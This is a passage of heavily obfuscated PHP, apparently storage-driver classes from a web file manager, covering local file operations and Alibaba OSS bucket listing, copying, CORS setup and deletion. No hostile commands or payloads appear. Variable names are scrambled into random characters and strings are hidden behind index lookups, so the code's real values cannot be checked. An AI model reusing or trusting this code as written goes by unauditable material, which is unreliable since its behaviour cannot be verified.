$this->getPathOuter($÷¦Âõí) : !1; } public function size($ÁÚ¡Ã„) { $ÁÚ¡Ã„ = $this->iconvSystem($ÁÚ¡Ã„); return filesize_64($ÁÚ¡Ã„); } public function info($•™üòÂâ) { $•™üòÂâ = $this->iconvSystem($•™üòÂâ); if ($this->isFolder($•™üòÂâ)) { return $this->folderInfo($•™üòÂâ); } else { if ($this->isFile($•™üòÂâ)) { return $this->fileInfo($•™üòÂâ); } } return !1; } protected function infoChildren($šİÑë½, &$ÏÈÁˆ—ª, $ıÈšõÑ = true) { $ìº”Æ¯’ =& $_SERVER[­õöî’–]; check_abort_echo(); $šİÑë½ = rtrim($šİÑë½, $ìº”Æ¯’[8]) . $ìº”Æ¯’[8]; if ($ıÈšõÑ) { $šİÑë½ = $this->iconvSystem($šİÑë½); } if (!($íÂú‰Ç = @opendir($šİÑë½))) { return; } while (($¯§ãşä = readdir($íÂú‰Ç)) !== !1) { if ($¯§ãşä == $ìº”Æ¯’[10] || $¯§ãşä == $ìº”Æ¯’[1381]) { continue; } $™Ìº—éƒ = $šİÑë½ . $¯§ãşä; if (is_file($™Ìº—éƒ) || is_link($™Ìº—éƒ)) { $ÏÈÁˆ—ª[$ìº”Æ¯’[77]]++; $ÏÈÁˆ—ª[$ìº”Æ¯’[76]] += filesize_64($™Ìº—éƒ); } else { if (is_dir($™Ìº—éƒ)) { $ÏÈÁˆ—ª[$ìº”Æ¯’[78]]++; $this->infoChildren($™Ìº—éƒ, $ÏÈÁˆ—ª, !1); } } } closedir($íÂú‰Ç); } private function folderInfo($­ÊÄêØœ, $ú¨ò”Ò = false) { $È¯¡½Î  =& $_SERVER[­õöî’–]; $­ÊÄêØœ = rtrim($­ÊÄêØœ, $È¯¡½Î [8]) . $È¯¡½Î [8]; $§á¨–Øã = $this->iconvApp($this->pathThis($­ÊÄêØœ)); if ($ú¨ò”Ò) { return array($È¯¡½Î [32] => $§á¨–Øã, $È¯¡½Î [84] => $this->getPathOuter($­ÊÄêØœ), $È¯¡½Î [33] => $È¯¡½Î [75]); } $„ÓÅüó… = array($È¯¡½Î [32] => $§á¨–Øã, $È¯¡½Î [84] => $this->getPathOuter($­ÊÄêØœ), $È¯¡½Î [33] => $È¯¡½Î [75], $È¯¡½Î [200] => @filectime($­ÊÄêØœ), $È¯¡½Î [85] => @filemtime($­ÊÄêØœ), $È¯¡½Î [1384] => @fileatime($­ÊÄêØœ), $È¯¡½Î [1385] => is_readable($­ÊÄêØœ), $È¯¡½Î [1386] => is_writable($­ÊÄêØœ), $È¯¡½Î [1387] => get_mode($­ÊÄêØœ)); return $„ÓÅüó…; } private function fileInfo($ÉŞ×¢¦, $§¿¹×š = false) { $§›Ã§êÙ =& $_SERVER[­õöî’–]; $»¢œ€Öø = $this->iconvApp($this->pathThis($ÉŞ×¢¦)); if ($§¿¹×š) { return array($§›Ã§êÙ[32] => $»¢œ€Öø, $§›Ã§êÙ[84] => $this->getPathOuter($ÉŞ×¢¦), $§›Ã§êÙ[33] => $§›Ã§êÙ[199], $§›Ã§êÙ[76] => $this->size($ÉŞ×¢¦), $§›Ã§êÙ[174] => $this->ext($»¢œ€Öø)); } $’Ç¼Î½¯ = array($§›Ã§êÙ[32] => $»¢œ€Öø, $§›Ã§êÙ[84] => $this->getPathOuter($ÉŞ×¢¦), $§›Ã§êÙ[33] => $§›Ã§êÙ[199], $§›Ã§êÙ[200] => @filectime($ÉŞ×¢¦), $§›Ã§êÙ[85] => @filemtime($ÉŞ×¢¦), $§›Ã§êÙ[1384] => @fileatime($ÉŞ×¢¦), $§›Ã§êÙ[76] => $this->size($ÉŞ×¢¦), $§›Ã§êÙ[174] => $this->ext($»¢œ€Öø), $§›Ã§êÙ[1385] => is_readable($ÉŞ×¢¦), $§›Ã§êÙ[1386] => is_writable($ÉŞ×¢¦), $§›Ã§êÙ[1387] => get_mode($ÉŞ×¢¦)); return $’Ç¼Î½¯; } public function exist($€…™óÑ€) { $€…™óÑ€ = $this->iconvSystem($€…™óÑ€); return @file_exists($€…™óÑ€); } public function isFile($®´ıŒ€¸) { $®´ıŒ€¸ = $this->iconvSystem($®´ıŒ€¸); return @is_file($®´ıŒ€¸); } public function isFolder($ò®ÅéÄğ) { $ò®ÅéÄğ = $this->iconvSystem($ò®ÅéÄğ); return @is_dir($ò®ÅéÄğ); } public function listPath($ ôî®òò, $¨…õ·êï = false) { $ÚˆÍÊ =& $_SERVER[­õöî’–]; $ ôî®òò = $this->iconvSystem($ ôî®òò); $ ôî®òò = rtrim($ ôî®òò, $ÚˆÍÊ[8]) . $ÚˆÍÊ[8]; $š¶¤ÑÆç = array($ÚˆÍÊ[82] => array(), $ÚˆÍÊ[83] => array()); if (!($âëñÖëá = @opendir($ ôî®òò))) { return $š¶¤ÑÆç; } while (($è‹‡Öƒ = readdir($âëñÖëá)) !== !1) { if ($è‹‡Öƒ == $ÚˆÍÊ[10] || $è‹‡Öƒ == $ÚˆÍÊ[1381]) { continue; } $òÜáñÏ– = $ ôî®òò . $è‹‡Öƒ; if (is_file($òÜáñÏ–)) { $š¶¤ÑÆç[$ÚˆÍÊ[83]][] = $this->fileInfo($òÜáñÏ–, $¨…õ·êï); } else { $š¶¤ÑÆç[$ÚˆÍÊ[82]][] = $this->folderInfo($òÜáñÏ–, $¨…õ·êï); } } closedir($âëñÖëá); return $š¶¤ÑÆç; } public function listAll($Óñ¥àë, &$ëØÀ¬¸ = array()) { $ôê¨ÕÚ =& $_SERVER[­õöî’–]; $Óñ¥àë = $this->iconvSystem($Óñ¥àë); $Óñ¥àë = rtrim($Óñ¥àë, $ôê¨ÕÚ[8]) . $ôê¨ÕÚ[8]; if (!($·Ø²û‚Ÿ = @opendir($Óñ¥àë))) { return $ëØÀ¬¸; } while (($šµ‰¸â¹ = readdir($·Ø²û‚Ÿ)) !== !1) { if ($šµ‰¸â¹ == $ôê¨ÕÚ[10] || $šµ‰¸â¹ == $ôê¨ÕÚ[1381]) { continue; } $„‘Ù„ò„ = $Óñ¥àë . $šµ‰¸â¹; if (is_dir($„‘Ù„ò„) && !is_link($„‘Ù„ò„)) { $ëØÀ¬¸[] = array($ôê¨ÕÚ[84] => $„‘Ù„ò„ . $ôê¨ÕÚ[8], $ôê¨ÕÚ[75] => 1, $ôê¨ÕÚ[85] => @filemtime($„‘Ù„ò„), $ôê¨ÕÚ[76] => 0); $this->listAll($„‘Ù„ò„, $ëØÀ¬¸); } else { $ëØÀ¬¸[] = array($ôê¨ÕÚ[84] => $„‘Ù„ò„, $ôê¨ÕÚ[75] => 0, $ôê¨ÕÚ[85] => @filemtime($„‘Ù„ò„), $ôê¨ÕÚ[76] => $this->size($„‘Ù„ò„)); } } closedir($·Ø²û‚Ÿ); return $ëØÀ¬¸; } public function has($±³ã°¡Ù, $Äî¶Àıê = false, $˜—µÀ­ö = true) { $Ù“½ˆ =& $_SERVER[­õöî’–]; $±³ã°¡Ù = $this->iconvSystem($±³ã°¡Ù); $±³ã°¡Ù = rtrim($±³ã°¡Ù, $Ù“½ˆ[8]) . $Ù“½ˆ[8]; if (!($ˆì¸ü› = @opendir($±³ã°¡Ù))) { return !1; } $Å­ìË¥š = 0; $ÛÚ•œ£¿ = 0; $›‰œ¾ä = 0; while (($À€ÉÜÂ = readdir($ˆì¸ü›)) !== !1) { if ($À€ÉÜÂ == $Ù“½ˆ[10] || $À€ÉÜÂ == $Ù“½ˆ[1381]) { continue; } $úı™€”¶ = $±³ã°¡Ù . $À€ÉÜÂ; if ($Äî¶Àıê) { $›‰œ¾ä++; if (@is_file($úı™€”¶)) { $Å­ìË¥š++; } else { $ÛÚ•œ£¿++; } if ($›‰œ¾ä > 10000) { break; } continue; } if ($˜—µÀ­ö) { if (@is_file($úı™€”¶)) { return !0; } } else { if (@is_dir($úı™€”¶ . $Ù“½ˆ[8])) { return !0; } } } closedir($ˆì¸ü›); if ($Äî¶Àıê) { return array($Ù“½ˆ[207] => $Å­ìË¥š, $Ù“½ˆ[208] => $ÛÚ•œ£¿); } return !1; } public function hashSimple($”‚«Ëõƒ) { $ÈüŠÛé± =& $_SERVER[­õöî’–]; if (!$”‚«Ëõƒ) { return md5($ÈüŠÛé±[12]); } $”‚«Ëõƒ = $this->iconvSystem($”‚«Ëõƒ); $ú—ˆÆ” = $this->size($”‚«Ëõƒ); $¸É»¢»® = 200; $¤Œò¿ó’ = 50; if ($ú—ˆÆ” <= $¸É»¢»® * $¤Œò¿ó’) { return $this->hashMd5($”‚«Ëõƒ) . $ú—ˆÆ”; } $†×–á = $ÈüŠÛé±[12]; $İÁ­¨Ñ¬ = intval($ú—ˆÆ” / $¤Œò¿ó’); $éãÅİ§‡ = fopen($”‚«Ëõƒ, $ÈüŠÛé±[1388]); if (!$éãÅİ§‡) { return $†×–á; } for ($Ç«Ã‹›è = 0; $Ç«Ã‹›è < $¤Œò¿ó’; $Ç«Ã‹›è++) { fseek_64($éãÅİ§‡, $İÁ­¨Ñ¬ * $Ç«Ã‹›è); $†×–á .= fread($éãÅİ§‡, $¸É»¢»®); } fseek_64($éãÅİ§‡, $ú—ˆÆ” - $¸É»¢»®); $†×–á .= fread($éãÅİ§‡, $¸É»¢»®); fclose($éãÅİ§‡); return md5($†×–á) . $ú—ˆÆ”; } public function getContent($¨¼ø†¥¾) { $¨¼ø†¥¾ = $this->iconvSystem($¨¼ø†¥¾); return file_get_contents($¨¼ø†¥¾); } public function setContent($ŞŒÂŞÊæ, $À‡Ö¯Ëá = '') { $ŞŒÂŞÊæ = $this->iconvSystem($ŞŒÂŞÊæ); $Á´¶ö½¯ = @file_put_contents($ŞŒÂŞÊæ, $À‡Ö¯Ëá, LOCK_EX); clearstatcache(); @chmod($ŞŒÂŞÊæ, $this->pathAuth); return $Á´¶ö½¯ === !1 ? !1 : !0; } public function fileSubstr($ó¦¾Û›ô, $ø ÉÂëš = 0, $° ìª©Û = false) { $¼ş…©´† =& $_SERVER[­õöî’–]; $ó¦¾Û›ô = $this->iconvSystem($ó¦¾Û›ô); if ($° ìª©Û === !1) { $° ìª©Û = $this->size($ó¦¾Û›ô); } if ($° ìª©Û <= 0) { return $¼ş…©´†[12]; } $µ“º‰ñ© = fopen($ó¦¾Û›ô, $¼ş…©´†[1388]); if (!$µ“º‰ñ©) { return !1; } fseek_64($µ“º‰ñ©, $ø ÉÂëš); $˜ı‡õÑ = fread($µ“º‰ñ©, $° ìª©Û); fclose($µ“º‰ñ©); return $˜ı‡õÑ; } public function upload($ñ¬ŒŞÇ, $«ÔƒééÊ, $Òõ¨õ›” = false, $Ë±Á˜ä˜ = REPEAT_REPLACE) { if ($Òõ¨õ›”) { return $this->moveFile($«ÔƒééÊ, $ñ¬ŒŞÇ); } return $this->copyFile($«ÔƒééÊ, $ñ¬ŒŞÇ); } public function setModifyTime($ Ÿñ²¾ø, $ˆÁËğ¤ = '') { @touch($ Ÿñ²¾ø, intval($ˆÁËğ¤)); } public function download($¶ÇÎ›ä—, $Ç°ş¿¯Û) { return $this->iconvSystem($¶ÇÎ›ä—); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Êì“Ğ¹¬) { parent::__construct($Êì“Ğ¹¬); $this->signatureVersion($_SERVER[­õöî’–][216]); } public function fileOutLink($ÏÖİşó¡) { $ßùÖ¡ıŒ =& $_SERVER[­õöî’–]; if (substr($ÏÖİşó¡, 0, 7) == $ßùÖ¡ıŒ[1332]) { $ÏÖİşó¡ = $ßùÖ¡ıŒ[1333] . substr($ÏÖİşó¡, 7); } header($ßùÖ¡ıŒ[161] . $ÏÖİşó¡); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($¼ÔşÏáØ) { parent::__construct(); include_once SDK_DIR . $_SERVER[­õöî’–][1389]; $this->_init($¼ÔşÏáØ); } public function _init($œ‚ô†ß‰) { $Ë¤ ëİ¼ =& $_SERVER[­õöî’–]; foreach ($œ‚ô†ß‰ as $»¤¯œ¤‘ => $çÌşä×Š) { if (isset($this->{$»¤¯œ¤‘})) { $this->{$»¤¯œ¤‘} = $çÌşä×Š; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ë¤ ëİ¼[1390] . LNG($Ë¤ ëİ¼[1391])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ğ¥µ¯£Ú =& $_SERVER[­õöî’–]; $ÁÛĞÆºã = new OSS\Model\CorsConfig(); $€àŞóãá = new OSS\Model\CorsRule(); $€àŞóãá->addAllowedOrigin($ğ¥µ¯£Ú[1392]); $€àŞóãá->addAllowedMethod($ğ¥µ¯£Ú[1393]); $€àŞóãá->addAllowedMethod($ğ¥µ¯£Ú[1394]); $€àŞóãá->addAllowedMethod($ğ¥µ¯£Ú[1395]); $€àŞóãá->addAllowedMethod($ğ¥µ¯£Ú[1396]); $€àŞóãá->addAllowedMethod($ğ¥µ¯£Ú[160]); $€àŞóãá->setMaxAgeSeconds(600); $€àŞóãá->addExposeHeader($ğ¥µ¯£Ú[1397]); $€àŞóãá->addAllowedHeader($ğ¥µ¯£Ú[1392]); $ÁÛĞÆºã->addRule($€àŞóãá); try { $this->client->putBucketCors($this->bucket, $ÁÛĞÆºã); } catch (OSS\Core\OssException $¸úŞñŸè) { return !1; } return !0; } public function getBucketCors() { $¢×·Ç¾ =& $_SERVER[­õöî’–]; $Òî¹¤³ = null; try { $Òî¹¤³ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÁÃÌ‰í¼) { return null; } if (!$Òî¹¤³ || !($óâøÈ‰‹ = $Òî¹¤³->getRules())) { return null; } $®şè¤ = $óâøÈ‰‹[0]->getAllowedOrigins(); $ìÓˆı¢ = $óâøÈ‰‹[0]->getAllowedMethods(); $åÃæğ¦ê = $óâøÈ‰‹[0]->getMaxAgeSeconds(); $—š—¼İ¤ = $óâøÈ‰‹[0]->getExposeHeaders(); $ï×ßéŞû = $óâøÈ‰‹[0]->getAllowedHeaders(); return array($¢×·Ç¾[187] => isset($®şè¤[0]) ? $®şè¤[0] : $¢×·Ç¾[12], $¢×·Ç¾[191] => $ìÓˆı¢, $¢×·Ç¾[1398] => $åÃæğ¦ê, $¢×·Ç¾[1399] => isset($—š—¼İ¤[0]) ? $—š—¼İ¤[0] : $¢×·Ç¾[12], $¢×·Ç¾[189] => isset($ï×ßéŞû[0]) ? $ï×ßéŞû[0] : $¢×·Ç¾[12]); } public function isBucketCors() { $Ì¢ÌÍó =& $_SERVER[­õöî’–]; $‡Ì’×·ö = $this->getBucketCors(); if (!$‡Ì’×·ö || !is_array($‡Ì’×·ö)) { return !1; } if ($‡Ì’×·ö[$Ì¢ÌÍó[187]] != $Ì¢ÌÍó[188] || $‡Ì’×·ö[$Ì¢ÌÍó[189]] != $Ì¢ÌÍó[188]) { return !1; } $±¬àâƒö = array_map($Ì¢ÌÍó[190], $‡Ì’×·ö[$Ì¢ÌÍó[191]]); if (!is_array($±¬àâƒö)) { $±¬àâƒö = array(); } $í¦ô®¾ = array($Ì¢ÌÍó[192], $Ì¢ÌÍó[193], $Ì¢ÌÍó[194], $Ì¢ÌÍó[195], $Ì¢ÌÍó[196]); $ƒ¿İäÍĞ = array_diff($í¦ô®¾, $±¬àâƒö); return empty($ƒ¿İäÍĞ); } public function mkfile($Ä®‹±î, $š³ÍÍ†º = '', $»¹‹©Ñ = REPEAT_RENAME) { $¥ğ´á£ = $this->setContent($Ä®‹±î, $š³ÍÍ†º); if ($¥ğ´á£ !== !1) { return $this->getPathOuter($Ä®‹±î); } return !1; } public function mkdir($Á™ÚÈ´, $™Øç¨ÑÎ = REPEAT_SKIP) { if ($™Øç¨ÑÎ && $this->_isFolder($Á™ÚÈ´)) { return $this->getPathOuter($Á™ÚÈ´); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Á™ÚÈ´)); } catch (OSS\Core\OssException $ãû¯Ï§) { return !1; } return $this->getPathOuter($Á™ÚÈ´); } private function fileList($·ßƒÒ©â, $Œ°–ü’‡ = '', $¾óÓŞÄ® = 0) { $å´íââ€ =& $_SERVER[­õöî’–]; $·ßƒÒ©â = trim($·ßƒÒ©â, $å´íââ€[8]); $¬èÜÁ = empty($·ßƒÒ©â) && $·ßƒÒ©â !== $å´íââ€[197] ? $å´íââ€[12] : $·ßƒÒ©â . $å´íââ€[8]; $¶öÂ£À = $å´íââ€[12]; $¼è–¥¯³ = 1000; $ääê Ğ¨ = $‚Í‘º“ú = array(); while (!0) { check_abort(); $¦åıÚß¦ = array($å´íââ€[1400] => $Œ°–ü’‡, $å´íââ€[1401] => $¬èÜÁ, $å´íââ€[1402] => $¼è–¥¯³, $å´íââ€[1403] => $¶öÂ£À); try { $ç‰×¼›¬ = $this->client->listObjects($this->bucket, $¦åıÚß¦); } catch (OSS\Core\OssException $¸¦¼ÈŠ) { break; } $¶öÂ£À = $ç‰×¼›¬->getNextMarker(); $À‚äÑò = $ç‰×¼›¬->getObjectList(); $€ÇŠÒ’… = $ç‰×¼›¬->getPrefixList(); foreach ($À‚äÑò as $„Ç¶ñüİ) { if ($„Ç¶ñüİ->getKey() == $¬èÜÁ) { continue; } $Ù§¬Áı¢ = $„Ç¶ñüİ->getKey(); $ßîöòø = $„Ç¶ñüİ->getSize(); $¾¿ÁÖƒš = $„Ç¶ñüİ->getLastModified(); $°±’Ôİä = $¾óÓŞÄ® ? array($å´íââ€[32] => $Ù§¬Áı¢, $å´íââ€[76] => $ßîöòø, $å´íââ€[203] => strtotime($¾¿ÁÖƒš)) : $Ù§¬Áı¢; $ô·Ôï€¶ = $ßîöòø == 0 && substr($Ù§¬Áı¢, strlen($Ù§¬Áı¢) - 1, 1) == $å´íââ€[8] ? !0 : !1; $Õ…÷¥øÔ = array($å´íââ€[76] => $ßîöòø, $å´íââ€[1404] => $ßîöòø, $å´íââ€[85] => strtotime($¾¿ÁÖƒš), $å´íââ€[1405] => $¾¿ÁÖƒš); $this->cacheMethodInfoSet($Ù§¬Áı¢, $ô·Ôï€¶, $Õ…÷¥øÔ); if ($ô·Ôï€¶) { $ääê Ğ¨[] = $Ù§¬Áı¢; continue; } $‚Í‘º“ú[] = $°±’Ôİä; } foreach ($€ÇŠÒ’… as $“’íì±Ü) { $ääê Ğ¨[] = $“’íì±Ü->getPrefix(); $this->cacheMethodInfoSet($“’íì±Ü->getPrefix(), !0); } if ($¶öÂ£À === $å´íââ€[12]) { break; } } $this->cacheMethodInfoSet($·ßƒÒ©â, !0); return array($å´íââ€[82] => $ääê Ğ¨, $å´íââ€[83] => $‚Í‘º“ú); } public function copyFile($ïÜâğ¢‰, $”Øê’ø) { $Â°¸ŞÊ = $this->size($ïÜâğ¢‰); if ($Â°¸ŞÊ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ïÜâğ¢‰, $this->bucket, $this->pathEncode($”Øê’ø)); } catch (OSS\Core\OssException $±£Ãú–) { return !1; } return $this->getPathOuter($”Øê’ø); } $‘‹¾¦‹ = $this->multiCopyObject($ïÜâğ¢‰, $”Øê’ø, $Â°¸ŞÊ); return $‘‹¾¦‹ ? $this->getPathOuter($”Øê’ø) : !1; } private function multiCopyObject($­²ùş€‡, $•àŸ¤Ğ™, $°—Ûş§Æ) { $’¡ñÇ·ø =& $_SERVER[­õöî’–]; try { $ßıŠÔä¡ = array(); if ($øëÜ·ı = $this->hashMd5($­²ùş€‡)) { $ßıŠÔä¡ = array(OSS\OssClient::OSS_HEADERS => array($’¡ñÇ·ø[1406] => $øëÜ·ı)); } $»àôÜ‰ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($•àŸ¤Ğ™), $ßıŠÔä¡); $™Ö¢µì· = 1; $ÒÒË’•¿ = 0; $½”ÓÀêÀ = array(); $½“¶áÇŸ = 1024 * 1024 * 10; $¥¢•Íü = $this->client->generateMultiuploadParts($°—Ûş§Æ, $½“¶áÇŸ); foreach ($¥¢•Íü as $­ö‘…Ñ˜ => $®Ÿ¹ªÃŞ) { $éŠÉÓÌŠ = $ÒÒË’•¿ + (int) $®Ÿ¹ªÃŞ[$’¡ñÇ·ø[1407]]; $Ïğöü¦İ = (int) $®Ÿ¹ªÃŞ[$’¡ñÇ·ø[337]] + $éŠÉÓÌŠ - 1; $ÌóóóºØ = array($’¡ñÇ·ø[1408] => $éŠÉÓÌŠ, $’¡ñÇ·ø[1409] => $Ïğöü¦İ); $½”ÓÀêÀ[] = $this->client->uploadPartCopy($this->bucket, $­²ùş€‡, $this->bucket, $this->pathEncode($•àŸ¤Ğ™), $™Ö¢µì·, $»àôÜ‰, $ÌóóóºØ); $™Ö¢µì· = $™Ö¢µì· + 1; } $êÈ½±ü = array(); foreach ($½”ÓÀêÀ as $­ö‘…Ñ˜ => $Œ†ÙÍÈ’) { $êÈ½±ü[] = array($’¡ñÇ·ø[1410] => $­ö‘…Ñ˜ + 1, $’¡ñÇ·ø[1411] => $Œ†ÙÍÈ’); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($•àŸ¤Ğ™), $»àôÜ‰, $êÈ½±ü); } catch (OSS\Core\OssException $í­°ù£õ) { return !1; } return !0; } public function moveFile($ñüŠíÎ®, $ºêæ•òµ) { if ($this->copyFile($ñüŠíÎ®, $ºêæ•òµ)) { $this->remove($ñüŠíÎ®); return $this->getPathOuter($ºêæ•òµ); } return !1; } public function delFile($ËŠÌÁè) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ËŠÌÁè)); } catch (OSS\Core\OssException $Å¶º¨¦Ÿ) { return !1; } return !0; } public function delFolder($úŠáÓÏ£) { $¢…­ê³õ =& $_SERVER[­õöî’–]; if (!$this->exist($úŠáÓÏ£)) { return !0; } $this->listItemCache = !1; $®‚’û¶Ô = $this->fileList($úŠáÓÏ£); $this->listItemCache = !0; $Ê—³£æû = trim($úŠáÓÏ£, $¢…­ê³õ[8]) . $¢…­ê³õ[8]; if (!empty($úŠáÓÏ£) && $úŠáÓÏ£ !== $¢…­ê³õ[197] && !in_array($Ê—³£æû, $®‚’û¶Ô[$¢…­ê³õ[82]])) { $®‚’û¶Ô[$¢…­ê³õ[82]][] = $Ê—³£æû; } $•Ó¿€ü© = $this->delByBatch($®‚’û¶Ô[$¢…­ê³õ[83]]); if (!$•Ó¿€ü©) { return !1; } $•Ó¿€ü© = $this->delByBatch($®‚’û¶Ô[$¢…­ê³õ[82]]); if (!$•Ó¿€ü©) { return !1; } return $this->delFile($Ê—³£æû); } private function delByBatch($ğ•´£“) { foreach (array_chunk($ğ•´£“, 1000) as $Ùıâ°§) { try { $this->client->deleteObjects($this->bucket, $Ùıâ°§); } catch (OSS\Core\OssException $ÄîêŞ) { return !1; } } return !0; } public function rename($õçÕõÅ», $¡¸é·¹») { return $this->renameObject($õçÕõÅ», $¡¸é·¹»); } private function fileInfo($ƒ âáŠø, $êÁó = false, $Ó€íòç™ = array()) { $ØÈó½ É =& $_SERVER[­õöî’–]; $›ğÏ¼¦á = array($ØÈó½ É[32] => $this->pathThis($ƒ âáŠø), $ØÈó½ É[84] => $this->getPathOuter($ƒ âáŠø), $ØÈó½ É[33] => $ØÈó½ É[199], $ØÈó½ É[76] => isset($Ó€íòç™[$ØÈó½ É[76]]) ? $Ó€íòç™[$ØÈó½ É[76]] : 0, $ØÈó½ É[174] => $this->ext($ƒ âáŠø)); if ($êÁó) { return $›ğÏ¼¦á; } $›ğÏ¼¦á[$ØÈó½ É[200]] = $›ğÏ¼¦á[$ØÈó½ É[85]] = 0; $›ğÏ¼¦á[$ØÈó½ É[201]] = $›ğÏ¼¦á[$ØÈó½ É[202]] = !0; if (empty($Ó€íòç™)) { $ŠùÛ‘”¹ = $this->objectMeta($ƒ âáŠø); if (!$ŠùÛ‘”¹) { return $›ğÏ¼¦á; } $Ó€íòç™ = array($ØÈó½ É[85] => strtotime($ŠùÛ‘”¹[$ØÈó½ É[1405]]), $ØÈó½ É[76] => $ŠùÛ‘”¹[$ØÈó½ É[1404]] + 0); } if (isset($Ó€íòç™[$ØÈó½ É[76]])) { $›ğÏ¼¦á[$ØÈó½ É[76]] = $Ó€íòç™[$ØÈó½ É[76]]; } if (isset($Ó€íòç™[$ØÈó½ É[85]])) { $›ğÏ¼¦á[$ØÈó½ É[85]] = $Ó€íòç™[$ØÈó½ É[85]]; } if (isset($Ó€íòç™[$ØÈó½ É[203]]) && !trim($›ğÏ¼¦á[$ØÈó½ É[85]])) { $›ğÏ¼¦á[$ØÈó½ É[85]] = $Ó€íòç™[$ØÈó½ É[203]]; } return $›ğÏ¼¦á; } private function folderInfo($ıúÍ˜öù, $Áƒ—‹†§ = false, $®œƒ‰ª = array()) { $¬¢„ıÆï =& $_SERVER[­õöî’–]; $ÂÇãğ‹ˆ = array($¬¢„ıÆï[32] => $this->pathThis($ıúÍ˜öù), $¬¢„ıÆï[84] => $this->getPathOuter($¬¢„ıÆï[8] . $ıúÍ˜öù), $¬¢„ıÆï[33] => $¬¢„ıÆï[75]); if ($Áƒ—‹†§) { return $ÂÇãğ‹ˆ; } $ÂÇãğ‹ˆ[$¬¢„ıÆï[200]] = $ÂÇãğ‹ˆ[$¬¢„ıÆï[85]] = 0; $ÂÇãğ‹ˆ[$¬¢„ıÆï[201]] = $ÂÇãğ‹ˆ[$¬¢„ıÆï[202]] = !0; if (empty($®œƒ‰ª)) { $ıúÍ˜öù = rtrim($ıúÍ˜öù, $¬¢„ıÆï[8]) . $¬¢„ıÆï[8]; $“úğ¥Ô° = $this->objectMeta($ıúÍ˜öù); if (!$“úğ¥Ô°) { return $ÂÇãğ‹ˆ; } $®œƒ‰ª = array($¬¢„ıÆï[200] => $“úğ¥Ô°[$¬¢„ıÆï[511]][$¬¢„ıÆï[1412]], $¬¢„ıÆï[85] => strtotime($“úğ¥Ô°[$¬¢„ıÆï[1405]])); } if (isset($®œƒ‰ª[$¬¢„ıÆï[85]])) { $ÂÇãğ‹ˆ[$¬¢„ıÆï[85]] = $®œƒ‰ª[$¬¢„ıÆï[85]]; } if (isset($®œƒ‰ª[$¬¢„ıÆï[200]])) { $ÂÇãğ‹ˆ[$¬¢„ıÆï[200]] = $®œƒ‰ª[$¬¢„ıÆï[200]]; } return $ÂÇãğ‹ˆ; } public function listPath($ú²ò…êÕ, $ğ£×ïÃè = false) { $§Â´£¶ =& $_SERVER[­õöî’–]; $Îâø³’Õ = $this->fileList($ú²ò…êÕ, $§Â´£¶[8], !0); foreach ($Îâø³’Õ[$§Â´£¶[82]] as $Ê×í£ç => $Ì†ØëÉ£) { $Îâø³’Õ[$§Â´£¶[82]][$Ê×í£ç] = $this->folderInfo($Ì†ØëÉ£, $ğ£×ïÃè, $Ì†ØëÉ£); } foreach ($Îâø³’Õ[$§Â´£¶[83]] as $Ê×í£ç => $Ì†ØëÉ£) { $Îâø³’Õ[$§Â´£¶[83]][$Ê×í£ç] = $this->fileInfo($Ì†ØëÉ£[$§Â´£¶[32]], $ğ£×ïÃè, $Ì†ØëÉ£); } return $Îâø³’Õ; } protected function infoChildren($ò›Ë–¶², &$¨øóäğ–) { $ƒÂö–Ê =& $_SERVER[­õöî’–]; $„°„‘±Ğ = $this->fileList($ò›Ë–¶², $ƒÂö–Ê[12], !0); $¨øóäğ–[$ƒÂö–Ê[78]] += count($„°„‘±Ğ[$ƒÂö–Ê[82]]); $¨øóäğ–[$ƒÂö–Ê[77]] += count($„°„‘±Ğ[$ƒÂö–Ê[83]]); foreach ($„°„‘±Ğ[$ƒÂö–Ê[83]] as $çõ®­æ±) { if (!$çõ®­æ± || !$çõ®­æ±[$ƒÂö–Ê[76]]) { continue; } $¨øóäğ–[$ƒÂö–Ê[76]] += $çõ®­æ±[$ƒÂö–Ê[76]]; } } public function has($Å«ğÓ°ñ, $©ú¬ôıÑ = false, $Ï¨ÅæÕ» = true) { $ŠÎÂÜ³ =& $_SERVER[­õöî’–]; $Å«ğÓ°ñ = trim($Å«ğÓ°ñ, $ŠÎÂÜ³[8]); $¾é˜Ø©— = empty($Å«ğÓ°ñ) && $Å«ğÓ°ñ !== $ŠÎÂÜ³[197] ? $ŠÎÂÜ³[12] : $Å«ğÓ°ñ . $ŠÎÂÜ³[8]; $Êƒ¡±›ò = $ŠÎÂÜ³[12]; $Ÿ¿‡ÈÓ” = 500; $˜— Œ¨ğ = $¡¶Éı‹˜ = 0; while (!0) { check_abort(); $ÎÓÂËõ© = array($ŠÎÂÜ³[1400] => $ŠÎÂÜ³[8], $ŠÎÂÜ³[1401] => $¾é˜Ø©—, $ŠÎÂÜ³[1402] => $Ÿ¿‡ÈÓ”, $ŠÎÂÜ³[1403] => $Êƒ¡±›ò); try { $ÁÂÃ¶»Å = $this->client->listObjects($this->bucket, $ÎÓÂËõ©); } catch (OSS\Core\OssException $ù•”¼›¦) { break; } $Êƒ¡±›ò = $ÁÂÃ¶»Å->getNextMarker(); $ĞÛû‘æ = $ÁÂÃ¶»Å->getObjectList(); $úı²üõ¼ = $ÁÂÃ¶»Å->getPrefixList(); if ($©ú¬ôıÑ) { if (count($ĞÛû‘æ) > 1 || count($ĞÛû‘æ) == 1 && $ĞÛû‘æ[0]->getKey() != $¾é˜Ø©—) { $˜— Œ¨ğ += count($ĞÛû‘æ) - 1; } if (!empty($úı²üõ¼)) { $¡¶Éı‹˜ += count($úı²üõ¼); } if ($Êƒ¡±›ò === $ŠÎÂÜ³[12]) { break; } continue; } if ($Ï¨ÅæÕ») { if (!empty($ĞÛû‘æ)) { if (count($ĞÛû‘æ) > 1 || $ĞÛû‘æ[0]->getKey() != 